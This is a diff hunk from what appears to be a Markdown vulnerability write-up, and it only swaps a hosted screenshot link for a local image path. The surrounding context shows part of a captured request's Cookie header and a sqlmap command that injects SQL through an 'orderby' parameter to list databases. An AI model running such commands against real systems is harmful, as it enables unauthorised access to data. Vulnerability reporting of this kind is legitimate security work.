@@ -52,7 +52,7 @@ Cookie: UM_distinctid=1785f7392888e1-02ece8c7e9a996-5771031-1fa400-1785f73928943
 sqlmap -r sql.txt -p orderby --dbs
 ```
 
-![7028e5e6-5d0f-44f9-a3e0-044636024b0c](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202090127479.png)
+![7028e5e6-5d0f-44f9-a3e0-044636024b0c](./images/202202090127479.png)
 
 ## 感谢名单
 
